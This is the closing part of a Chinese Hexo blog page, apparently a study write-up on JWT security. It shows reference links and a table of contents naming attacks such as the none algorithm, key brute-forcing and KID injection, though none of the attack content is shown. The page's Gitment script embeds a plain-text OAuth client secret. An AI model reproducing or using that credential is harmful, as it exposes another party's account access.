+<p><code>未获取flag！！！</code></p>
+<h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6776</span><br><span class="line">https:&#x2F;&#x2F;cyberpolygon.com&#x2F;materials&#x2F;security-of-json-web-tokens-jwt&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;swlh&#x2F;hacking-json-web-tokens-jwts-9122efe91e4a</span><br><span class="line">JWT绕过CTF</span><br><span class="line">https:&#x2F;&#x2F;delcoding.github.io&#x2F;2018&#x2F;03&#x2F;jwt-bypass&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.ctfhub.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.slideshare.net&#x2F;OWASP_Poland&#x2F;opd-2019-attacking-jwt-tokens</span><br></pre></td></tr></table></figure>
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#JWT" >
+    <span class="tag-code">JWT</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2020/10/14/MongoDB%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/">
+        <span class="nav-arrow">← </span>
+        
+          MongoDB审计工具
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2020/10/22/Sysmon%E5%AD%A6%E4%B9%A0/">
+        
+          Sysmon学习
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#JWT%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">JWT概述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E4%BC%A0%E7%BB%9F%E8%AE%A4%E8%AF%81"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">传统认证</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Cookie"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">Cookie</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#JWT%E7%BB%84%E6%88%90"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">JWT组成</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#header"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">header</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#payload"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">payload</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#signature"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">signature</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#JWT%E5%AE%89%E5%85%A8"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">JWT安全</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">加密算法</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E7%A9%BA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-nav-number">4.1.1.</span> <span class="toc-nav-text">空加密算法</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#RSA%E6%94%B9%E4%B8%BAHMAC"><span class="toc-nav-number">4.1.2.</span> <span class="toc-nav-text">RSA改为HMAC</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%AF%86%E9%92%A5%E6%9A%B4%E7%A0%B4"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">密钥暴破</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BF%AE%E6%94%B9KID%E5%8F%82%E6%95%B0"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">修改KID参数</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-nav-number">4.3.1.</span> <span class="toc-nav-text">任意文件读取</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-nav-number">4.3.2.</span> <span class="toc-nav-text">SQL注入</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">4.3.3.</span> <span class="toc-nav-text">命令执行</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BF%AE%E6%94%B9JKU-X5U"><span class="toc-nav-number">4.4.</span> <span class="toc-nav-text">修改JKU&#x2F;X5U</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-nav-number">4.5.</span> <span class="toc-nav-text">信息泄漏</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#JWT-Tools"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">JWT Tools</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#JWT%E6%94%BB%E5%87%BB"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">JWT攻击</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%A2%98%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">题一：信息泄漏</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%A2%98%E4%BA%8C%EF%BC%9ANone"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">题二：None</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%A2%98%E4%B8%89%EF%BC%9A%E5%BC%B1%E5%AF%86%E7%A0%81"><span class="toc-nav-number">6.3.</span> <span class="toc-nav-text">题三：弱密码</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%A2%98%E5%9B%9B%EF%BC%9A%E4%BF%AE%E6%94%B9%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95"><span class="toc-nav-number">6.4.</span> <span class="toc-nav-text">题四：修改签名算法</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Referer"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">Referer</span></a></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2020/10/21/JWT安全与实战/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "JWT安全与实战",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "0f87e490e00ee3fd87ef",
+          client_secret: "4a9d2b148e7971c2201ad12131ce8bf8159ccd2e"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <p class="copyright">
+    皖ICP备19004273
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
